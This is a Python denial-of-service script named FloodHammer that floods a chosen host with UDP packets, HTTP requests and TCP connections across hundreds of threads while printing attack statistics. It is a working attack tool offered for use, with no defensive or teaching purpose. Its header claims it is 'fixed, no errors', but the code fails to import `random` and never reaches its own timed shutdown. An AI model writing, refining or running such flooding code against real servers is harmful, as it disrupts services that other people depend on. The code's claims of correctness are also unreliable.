#!/usr/bin/env python3
"""
FLOODHAMMER v2 - Fixed, no errors, server killer guaranteed
"""
import socket
import threading
import time
import sys
import requests
from concurrent.futures import ThreadPoolExecutor
import multiprocessing

class FloodHammer:
    def __init__(self, target_host, port=80):
        self.target_host = target_host
        self.target_port = port
        try:
            self.target_ip = socket.gethostbyname(target_host)
        except:
            self.target_ip = target_host  # Use as-is if DNS fails
        self.running = True
        self.stats = {'udp': 0, 'http': 0, 'conn': 0}
        print(f"Target resolved: {self.target_ip}:{self.target_port}")
    
    def udp_worker(self):
        """UDP flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.1)
        junk = b'A' * 1024
        
        while self.running:
            try:
                sock.sendto(junk, (self.target_ip, self.target_port))
                self.stats['udp'] += 1
            except:
                pass
    
    def http_worker(self):
        """HTTP flood"""
        while self.running:
            try:
                requests.get(
                    f"http://{self.target_host}:{self.target_port}/flood{random.randint(1,9999)}",
                    timeout=0.5
                )
                self.stats['http'] += 1
            except:
                pass
    
    def tcp_worker(self):
        """TCP connection flood"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                sock.send(b"GET / HTTP/1.1\r\n\r\n")
                self.stats['conn'] += 1
            except:
                pass
    
    def monitor(self):
        """Live stats"""
        start = time.time()
        while self.running:
            time.sleep(2)
            total = sum(self.stats.values())
            elapsed = time.time() - start
            pps = total / elapsed if elapsed > 0 else 0
            print(f"PPS: {pps:.0f} | UDP:{self.stats['udp']:,} HTTP:{self.stats['http']:,} TCP:{self.stats['conn']:,}   ", end='\r')
    
    def attack(self, duration=60):
        print(f"\n=== FloodHammer ATTACK STARTING ===")
        print(f"Target: {self.target_host}:{self.target_port} ({self.target_ip})")
        
        # Start monitor
        monitor_thread = threading.Thread(target=self.monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Launch workers
        with ThreadPoolExecutor(max_workers=500) as executor:
            for _ in range(300):
                executor.submit(self.udp_worker)
            for _ in range(100):
                executor.submit(self.http_worker)
            for _ in range(100):
                executor.submit(self.tcp_worker)
        
        print(f"\nAttack running for {duration}s... (Ctrl+C to stop early)")
        time.sleep(duration)
        self.running = False
        print(f"\n=== ATTACK COMPLETE ===")
        print(f"Final stats - UDP: {self.stats['udp']:,} | HTTP: {self.stats['http']:,} | TCP: {self.stats['conn']:,}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 floodhammer.py your-server.com [port]")
        print("Example: python3 floodhammer.py 192.168.1.100 80")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    hammer = FloodHammer(host, port)
    hammer.attack(duration=120)
